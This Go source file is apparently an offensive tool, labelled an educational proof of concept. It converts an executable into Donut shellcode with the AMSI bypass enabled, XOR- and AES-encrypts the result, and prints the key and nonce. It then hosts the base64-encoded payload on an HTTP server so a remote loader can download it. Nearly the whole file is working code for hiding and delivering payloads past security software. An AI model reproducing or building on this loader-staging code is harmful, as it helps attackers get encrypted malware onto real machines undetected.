package main

import (
	"CipherAes/banner"
	cipher "CipherAes/help"
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"github.com/Binject/go-donut/donut"
	"github.com/akamensky/argparse"
	"github.com/fatih/color"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	color.Cyan(banner.Baneer)
	e := echo.New()

	e.Use(middleware.LoggerWithConfig(middleware.LoggerConfig{
		Format: "time=${time_rfc3339}, method=${method}, uri=${uri},Ip=${remote_ip}, status=${status}\n",
	}))

	parser := argparse.NewParser("Generador", "Convert you exe to shellcode.\n\t\t"+
		"dev 3xploit Poc Educative\n\t\t.")

	archstring := parser.String("a", "arquitecture", &argparse.Options{Required: false, Default: "x84", Help: "Targ x32,x64,x84"})
	dstFile := parser.String("o", "out", &argparse.Options{Required: false,
		Default: "Encrypted.bin", Help: "Output file."})

	srcFile := parser.String("i", "in", &argparse.Options{Required: true,
		Help: ".NET or EXE  execute in-memory."})

	//KEY := parser.String("k", "key", &argparse.Options{Required: false, Default:K, Help: "Insert Key for encryption. or default value. more security random"})
	if err := parser.Parse(os.Args); err != nil || *srcFile == "" {
		log.Println(parser.Usage(err))
		return
	}
	var donutarch donut.DonutArch
	switch strings.ToLower(*archstring) {
	case "x32", "386":
		donutarch = donut.X32

	case "x64", "amd64":
		donutarch = donut.X64

	case "x84":
		donutarch = donut.X84
	default:
		log.Fatal("arquitecture not supported")

	}

	config := new(donut.DonutConfig)
	config.Arch = donutarch
	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Type = donut.DONUT_MODULE_EXE
	config.Bypass = 3
	config.Format = 1
	config.Compress = 1

	payload, err := donut.ShellcodeFromFile(*srcFile, config)
	if err != nil {
		log.Println(err)
	}

	readBuf, _ := ioutil.ReadAll(payload)
	encrypt := cipher.Xor(readBuf, 31)
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	raw2 := cipher.Encrypt(encrypt, key, nonce)

	color.Blue("Realizando proceso de cifrado")
	color.Blue("Generando key and Nonce")

	time.Sleep(4 * time.Second)
	color.Blue("key " + base64.StdEncoding.EncodeToString(key))
	color.Blue("nonce " + base64.StdEncoding.EncodeToString(nonce))

	err = ioutil.WriteFile(*dstFile, raw2, 0644)

	color.Blue("Shellcode generated successfully")

	e.GET("/", func(c echo.Context) error {

		return c.String(http.StatusOK, base64.StdEncoding.EncodeToString(raw2))

	})

	// insert port
	fmt.Println("insert port")
	scan2 := bufio.NewScanner(os.Stdin)
	scan2.Scan()
	color.Blue("server On")
	e.Logger.Fatal(e.Start(":" + scan2.Text()))

}
